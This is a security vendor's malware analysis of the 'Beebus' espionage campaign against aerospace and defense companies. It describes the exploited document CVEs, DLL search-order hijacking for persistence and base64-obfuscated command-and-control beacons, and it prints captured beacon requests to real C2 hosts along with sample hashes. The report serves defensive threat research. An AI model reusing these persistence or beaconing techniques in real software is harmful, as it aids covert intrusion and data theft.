OPERATION BEEBUS

February 01, 2013 | by Vinay Pidathala, Zheng Bu, Thoufique Haq, Darien Kindlund | Targeted Attack
FireEye discovered an APT campaign consistently targeting companies in the aerospace and defense industries. The campaign has been in effect for sometime now.

Infection Vector
We have seen this campaign use both email and drive­by downloads as a means of infecting end users. The threat actor has consistently used attachment names of documents/white
papers released by well­known companies. The malicious email attachment exploits some common vulnerabilities in PDF and DOC files.
PDF:

CVE­2011­0611

DOC:

CVE­2012­0158

CVE­2012­0754

Table 1
The
malware uses a well­documented vulnerability in the Windows OS known as DLL search order hijacking. There is an order in which executables load DLLs on the Windows operating
system. This particular malware takes advantage of this vulnerability and drops a DLL called ntshrui.DLL in the C:\Windows directory. The first place from where the executable looks to load
the DLL is its own directory. By dropping the ntshrui.DLL in the directory C:\Windows, the malware achieves persistence.
Figures 1 and 2 below show the modified weaponized PDF, which was used in the spear phishing attack. The PDF on the left is the non­malicious version, while the one on the right is
malicious. As you can see from the pictures below, the original PDF was modified using the Ghostscript tool. Also the size of the malicious PDF is significantly smaller than the non­malicious
version.

Command
and Control

Figure 3. Initial GET request
The malware communicates with a remote command and control (CnC) server. The GET request in Figure 4 is the initial request that the compromised machine makes to "check in" with the
CnC server. The keyword "p=2," which is sent out as part of the URI, appears to indicate the version of the malware. Mining our database we found three versions of this malware and they
are noted in the table below. The version value is hard­coded in the ntshrui.DLL file in the samples we observed.

Figure 4. Encrypted data sent to CnC
It encrypts information it collects with the base64 algorithm and then sends it to the remote CnC server as seen in Figure 4. It is interesting to note that the base64 data is subjected to some
substitutions before it is sent out preventing run of the mill inspection on the wire. It replaces the ‘/’ (forward slash) and ‘+’ (plus) characters which are part of the base64 character set with ‘_’
(underscore) and ‘­‘ (hyphen) respectively. The code that performs this operation is shown in Figure 5.

Figure 5
A sample of the data that is encrypted and sent to the CnC server for version ‘p=2’ is seen in the memory dump shown in Figure 6. At offset 4­7 it contains a time­based counter. It uses the
keyword "osamu" in this instance to identify this particular campaign. The campaign keywords are not sent out in version ‘p=1’ but can still be found hardcoded in the DLL payload. The
hostname and OS information are also included in the beacon. It awaits further commands from the CnC server in response to the data sent out.

Figure 6
It has modules to capture system information (processor, disk, memory, OS), process id, process start time, and current user information. It also contains a module to download and execute
additional payloads and updates. It downloads in to %TEMP% directory and calls CreateProcessA to invoke execution as seen below:

Figure 7

Figure 8
The POST request looks very similar to the GET request and uses base64 encoding to encode the URI.

Memory Usage

Figure 9
The malware is fairly noisy sending multiple GET requests. In our test environment we observed that the POST request started a couple of hours after the malware initially checked in with
the CnC. Around the same time we also noticed a new exe get dropped under "C:\Documents And Settings\Administrator\Local Setting\Temp~ISUN32.exe". The two figures below show the
ISUN32.exe process start up and the exe get dropped under TEMP directory.

Timeline of the Beebus Campaign

From the timeline below, we were able to figure out that this campaign has been targeting companies in the Aerospace and Defense vertical in waves. There is no specific pattern to this
attack, we have seen days on which multiple weaponized emails were sent to several companies, and on other days we observed that the threat actor sent only one email to a specific target
organization. The chart below shows Beebus attacks in the last year.

ORIGIN/THREAT ACTOR ATTRIBUTION:

The term "Beebus" was coined from an initial sample in this campaign (MD5: 7ed557921ac60dfcb295ebabfd972301), which was originally submitted to VirusTotal on April 12, 2011.[1] After
this executable compromises the endpoint, this sample then generated command and control traffic to:
GET /s/asp?XAAAAM4w5jmOS_kMZlr67o8jettxsYA8dZgeNAHes­Nn5p­6AFUD6yncpz5AL6wAAA==p=1 HTTP/1.1
User­Agent: Mozilla/4.0 (compatible; )
Accept: */*
Host: bee.businessconsults.net
As early as March 2011, Joe Stewart at Dell SecureWorks reported that various subdomains off the primary domain of "businessconsults.net" have acted as command and control nodes for
the well­known "HUC Packet Transmit Tool" (aka "HTran")[2], which is a light­weight TCP proxy tool used by the nation state threat actor that breached RSA around that time, labeled by

McAfee as "Operation Shady RAT."[3] According to McAfee, one of the major tools, techniques, and procedures (TTPs) used by this threat actor was their use of obfuscated or encrypted
HTML comments embedded in otherwise benign websites, in order to indirectly control compromised endpoints.
As such, this TTP of obfuscated/encrypted HTML comments has been also widely reported in the media as associated with the nation state group called "Comment Group" or "Comment
Team," which is believed to be associated with the Chinese government.[4] Bloomberg reports that various US intelligence sources have labeled this activity as "Byzantine Candor",
accordingly.[5]
Based upon these correlations, we believe Beebus to be yet another TTP associated with threat actors based in China.
Another related sample (MD5: d7ec457be3fad8057580e07cae74becb) was originally submitted to VirusTotal on Sept. 23, 2011[6] and generates the following
"Beebus" traffic pattern:
GET /s/asp?XAAAAM4w5jmIa_kMZlr67o8jettxsYA8dZgeNAHes­Nn5p­6AFUD6yncpz5AL6wAAA==p=1 HTTP/1.1
User­Agent: Mozilla/4.0 (compatible; )
Accept: */*
Host: 68.96.31.136
Siilarly, the IP address (68.96.31.136) was another C2 node reported by Dell SecureWorks as hosting the HTran proxy infrastructure.[7]
